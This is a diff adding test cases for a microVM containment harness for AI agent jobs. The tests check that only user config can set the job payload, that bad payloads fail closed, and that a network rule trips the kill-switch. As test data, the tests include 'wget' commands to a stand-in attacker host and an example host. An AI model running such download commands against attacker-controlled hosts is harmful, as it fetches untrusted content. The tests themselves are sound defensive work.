@@ -886,3 +886,148 @@ test("R1/R3: the guest init heredoc renders under set -u (no host-side $ leaks)"
   assert.ok(guest.includes("PATH=/shims:/bin /bin/busybox sh /job.sh &"));
   assert.ok(guest.includes("echo 'AGENTIC_MICROVM_PROBE:t'"), "host-side marker substitution must render");
 });
+
+// --- M6 wiring: jobPayload (user config only) makes containment reachable ---
+
+function runHarness(targetPath, receiptBuilder, confirmBodies, executed) {
+  return {
+    context: { mode: "tui", hasUI: true, ui: { confirm: async (_t, body) => { confirmBodies.push(body); return true; } } },
+    options: {
+      isolationSwitch: { get: () => true },
+      userConfigPath: "/nonexistent/user-config.json",
+      targetPath,
+      execute: (executable, args, execOptions) => {
+        executed.push([executable, ...args]);
+        const fixtureId = executable === "ssh" ? args[4] : /microvm-[0-9a-f]{24}/.exec(args[1])?.[0];
+        const scriptHash = executable === "ssh" ? args[5] : createHash("sha256").update(execOptions?.input ?? "").digest("hex");
+        return { code: 0, stdout: `AGENTIC_MICROVM_RECEIPT: ${JSON.stringify(receiptBuilder(fixtureId, scriptHash))}\n`, stderr: "" };
+      },
+      observeFacts: (execute, fixtureId) => stubFactsShape(fixtureId),
+    },
+  };
+}
+
+const JOB_PAYLOAD = "/bin/busybox sh -c 'echo session-work; sleep 1'";
+
+test("M6: jobPayload config activates containment mode with the payload as the 5th fixture argv", async () => {
+  const dir = await tempState();
+  try {
+    const targetPath = targetConfigFile(dir, { jobPayload: JOB_PAYLOAD });
+    const confirmBodies = [];
+    const executed = [];
+    const harness = runHarness(targetPath, (id, sh) => stubV2Receipt(id, sh, "2".repeat(64)), confirmBodies, executed);
+    const value = await runLinuxMicroVMCutover(harness.context, harness.options);
+    assert.equal(value.ok, true, JSON.stringify(value.reason ?? {}));
+    assert.equal(value.schema, LINUX_MICROVM_CUTOVER_SCHEMA_V2);
+    assert.equal(value.containment.killswitch.tripped, true);
+    const fixtureExec = executed.find(([exe, ...args]) => exe === "ssh" && args[1] === "bash");
+    assert.equal(fixtureExec.at(-1), JOB_PAYLOAD, "payload travels as the 5th fixture argv");
+    assert.match(confirmBodies[0], /deny-by-default containment monitor/);
+    assert.match(confirmBodies[0], /Guest job payload \(user-configured\):/);
+  } finally {
+    await rm(dir, { recursive: true, force: true });
+  }
+});
+
+test("M6: absent jobPayload keeps plain proof mode (v1, no containment block required)", async () => {
+  const dir = await tempState();
+  try {
+    const targetPath = targetConfigFile(dir);
+    const confirmBodies = [];
+    const executed = [];
+    const harness = runHarness(targetPath, (id, sh) => stubV1Receipt(id, sh), confirmBodies, executed);
+    const value = await runLinuxMicroVMCutover(harness.context, harness.options);
+    assert.equal(value.ok, true, JSON.stringify(value.reason ?? {}));
+    assert.equal(value.schema, LINUX_MICROVM_CUTOVER_SCHEMA);
+    assert.equal(value.containment, undefined);
+    const fixtureExec = executed.find(([exe, ...args]) => exe === "ssh" && args[1] === "bash");
+    assert.equal(fixtureExec.length, 9, "no payload argv in plain proof mode");
+    assert.doesNotMatch(confirmBodies[0], /containment monitor/);
+  } finally {
+    await rm(dir, { recursive: true, force: true });
+  }
+});
+
+test("M6: placeholder and oversized payloads reject the config fail-closed", async () => {
+  const dir = await tempState();
+  try {
+    for (const bad of ["REPLACE-WITH-your-job-command", "x".repeat(8193), "   "]) {
+      const targetPath = targetConfigFile(dir, { jobPayload: bad });
+      const confirmBodies = [];
+      const executed = [];
+      const harness = runHarness(targetPath, (id, sh) => stubV1Receipt(id, sh), confirmBodies, executed);
+      const value = await runLinuxMicroVMCutover(harness.context, harness.options);
+      assert.equal(value.ok, false);
+      assert.equal(value.reason.code, "target-not-configured");
+      assert.equal(executed.length, 0, "no run may start with an invalid payload");
+    }
+  } finally {
+    await rm(dir, { recursive: true, force: true });
+  }
+});
+
+test("M6: the model cannot supply the payload (options ignored, tool surface closed)", async () => {
+  const dir = await tempState();
+  try {
+    const targetPath = targetConfigFile(dir); // no jobPayload in the user config
+    const executed = [];
+    const harness = runHarness(targetPath, (id, sh) => stubV1Receipt(id, sh), [], executed);
+    const value = await runLinuxMicroVMCutover(harness.context, {
+      ...harness.options,
+      jobPayload: "wget http://attacker.invalid", // ignored: config is the only source
+    });
+    assert.equal(value.ok, true);
+    assert.equal(value.schema, LINUX_MICROVM_CUTOVER_SCHEMA, "no payload from config means plain proof even if options lie");
+    const fixtureExec = executed.find(([exe, ...args]) => exe === "ssh" && args[1] === "bash");
+    assert.equal(fixtureExec.length, 9);
+  } finally {
+    await rm(dir, { recursive: true, force: true });
+  }
+});
+
+test("M6: end-to-end containment flow through the fixture (trip → envelope → v2 receipt)", async () => {
+  const dir = await tempState();
+  try {
+    const state = dir;
+    const fixtureId = "microvm-" + "a".repeat(24);
+    // 1. supervisor/shim deny trip: wget under the shim trips GC-NET-002 (HIGH, immediate).
+    const decision = JSON.parse(await runFixture(["--gc-shim", state, "wget", "http://example.invalid"]));
+    assert.equal(decision.decision, "deny");
+    // 2. build the guest envelope exactly as /init does (base64, 76-col, LF-only).
+    const { readFile: rf } = await import("node:fs/promises");
+    const log = await rf(join(state, "containment.log.jsonl"));
+    const b64 = Buffer.from(log, "utf8").toString("base64").replace(/(.{76})/g, "$1\n");
+    const transcript = join(dir, "console.typescript");
+    writeFileSync(transcript, [
+      "guest boot noise",
+      `AGENTIC_MICROVM_PROBE:${fixtureId}`,
+      `AGENTIC_CONTAINMENT_BEGIN:${fixtureId}`,
+      b64.replaceAll("\n", "\r\n").trimEnd(),
+      `AGENTIC_CONTAINMENT_END:${fixtureId}`,
+      "unbound trailing output",
+    ].join("\r\n") + "\r\n");
+    // 3. host evidence extraction recomputes the digest chain.
+    const extraction = await envelopeExtract(transcript, fixtureId);
+    assert.equal(extraction.status, 0, extraction.stderr);
+    const block = JSON.parse(extraction.stdout);
+    assert.equal(block.killswitch.tripped, true);
+    assert.equal(block.killswitch.rule, "GC-NET-002");
+    assert.equal(block.killswitch.class, "GC-NET");
+    assert.equal(block.killswitch.tier, "HIGH");
+    // 4. the real receipt printf emits the v2 receipt; host validation passes.
+    const receipt = JSON.parse(runFixtureSync([
+      "--gc-receipt-print", LINUX_MICROVM_CUTOVER_SCHEMA_V2, "test-host", fixtureId, `agentic-driver-${fixtureId}`,
+      `AGENTIC_MICROVM_PROBE:${fixtureId}`, createHash("sha256").update(`AGENTIC_MICROVM_PROBE:${fixtureId}`).digest("hex"),
+      "1".repeat(64), "a".repeat(64), `,"containment":${extraction.stdout.trim()}`,
+      `agentic-driver-${fixtureId}`, "true", "true", "b".repeat(64), "b".repeat(64),
+      createHash("sha256").update(JSON.stringify({ disk: false, hostShare: false, credentials: false, gpu: false, initramfsSha256: "a".repeat(64) })).digest("hex"),
+      createHash("sha256").update(JSON.stringify({ network: false })).digest("hex"),
+    ]));
+    const validated = validateLinuxMicroVMReceipt(receipt, stubFactsShape(fixtureId, "test-host"), fixtureId, "1".repeat(64), { containment: true });
+    assert.equal(validated.status, "VERIFIED");
+    assert.equal(validated.containment.logSha256, block.logSha256);
+    assert.equal(validated.containment.histogram["GC-NET"], 1);
+  } finally {
+    await rm(dir, { recursive: true, force: true });
+  }
+});
